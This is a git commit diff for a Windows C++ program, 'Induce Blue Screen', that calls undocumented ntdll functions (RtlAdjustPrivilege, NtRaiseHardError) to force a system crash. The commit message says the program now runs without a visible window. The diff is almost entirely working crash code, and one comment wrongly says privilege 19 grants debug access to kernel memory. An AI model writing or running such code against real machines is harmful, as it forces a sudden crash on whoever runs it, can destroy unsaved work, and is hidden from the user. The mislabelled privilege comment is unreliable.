1b2e2c63a271c21e9f0b13a34331e79549028ada
Luke Simmons <luke5083@live.com>
2021-06-01 17:27:35 -0500

    Update Program
    Updated to Visual Studio 2019. Changed subsystem to Windows from console so it can run without a window. Refactored and added better comments.

--- Induce Blue Screen/Main.cpp
+++ Induce Blue Screen/Main.cpp
@@ -1,22 +1,35 @@
-//includes
 #include <Windows.h>
 
-//type definitions required
-typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
-typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
+int WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
+	// Load the library in order to adjust privileges 
+	const LPVOID RTLAdjustPrivilegeLibAddress = GetProcAddress(LoadLibrary(L"ntdll.dll"), "RtlAdjustPrivilege");
 
-int main()
-{
-	//Hide the window
-	FreeConsole();
+	// Load the module in order to create the BSoD 
+	const LPVOID NtRaiseHardErrorModuleAddress = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
 
-	//Cause the blue screen
-	BOOLEAN bEnabled;
-	ULONG uResp;
-	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
-	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
-	pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
-	pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
-	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
-	NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
+	// Function cast for RtlAdjustPrivilege 
+	using pdef_RTLAdjustPrivilege = NTSTATUS(NTAPI*)(ULONG privilege, BOOLEAN enable, BOOLEAN currentThread,
+	                                                 PBOOLEAN enabled);
+
+	// Create the function to modify program's rights - typecast the typedef earlier to adjustPrivilegeLibAddress 
+	const auto RtlAdjustPrivilege = static_cast<pdef_RTLAdjustPrivilege>(RTLAdjustPrivilegeLibAddress);
+
+	// Function cast for NtRaiseHardError 
+	using pdef_NTRaiseHardError = NTSTATUS(NTAPI*)(NTSTATUS errorStatus, ULONG numberOfParameters,
+	                                               ULONG unicodeStringParameterMask OPTIONAL, PULONG_PTR parameters,
+	                                               ULONG responseOption, PULONG response);
+
+	// Create the function to crash the computer - typecast the typedef earlier to errorModuleAddress 
+	const auto NtRaiseHardError = static_cast<pdef_NTRaiseHardError>(NtRaiseHardErrorModuleAddress);
+
+	// Adjust privileges to debug mode so the program can have permission to edit kernel memory; see line 10343 of winnt.h for list of privileges 
+	BOOLEAN previousValue;
+	RtlAdjustPrivilege(19, TRUE, FALSE, &previousValue);
+
+	// Call to crash the computer
+	ULONG response;
+	NtRaiseHardError(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &response);
+
+	// Should take about 5 seconds to crash. Return an error if computer does not crash.
+	return -1;
 }
